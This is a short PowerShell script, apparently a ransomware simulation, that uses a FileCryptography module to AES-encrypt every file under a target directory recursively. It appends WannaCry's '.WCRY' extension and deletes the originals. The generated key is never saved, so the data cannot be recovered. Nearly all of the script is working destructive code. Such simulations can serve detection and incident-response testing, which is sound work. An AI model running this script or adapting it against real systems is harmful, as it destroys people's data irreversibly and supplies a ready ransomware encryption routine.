#==== global variables ===================================================================================
#Set path to source directory - Location of FileCryptography.psm1 module
$FileSourcePath = "C:\ransomware_simulation\sample_data"

#set path to target directory - Directory to be encrypted by the encryption engine
$FileTargetPath = "C:\core-app"

#target file types - File types to be encrypted - example '*.txt*','*.xml*','*.png*'
$TargetFiles = '*.*'



#set encrypted file extension - Appended file extension for encrypted files
$EncExtension = ".WCRY"


#END ==== global variables ===============================================================================

#Do not edit below here



#Import crypto functions and generate randomw key

import-module $FileSourcePath\FileCryptography.psm1
$key = New-CryptographyKey -AsPlainText


#find files to encrypt
$FileList = get-childitem -path $FileTargetPath\* -Include $TargetFiles -Recurse -force | where { ! $_.PSIsContainer }

#Select discovered files to encrypt
$FileCount = (get-childitem -path $FileTargetPath\* -Include $TargetFiles -Recurse -force | Measure-Object).Count



#Encrypt each selected file - Read file, Encrypt contents, Append Encrypted file extension

    foreach ($file in $FileList)
    {
        Write-Host "Encrypting $file"
        Protect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $EncExtension -RemoveSource
    }
    Write-VolumeCache C
    Write-Host "Encrypted $FileCount files." 
    Start-Sleep -Seconds 600
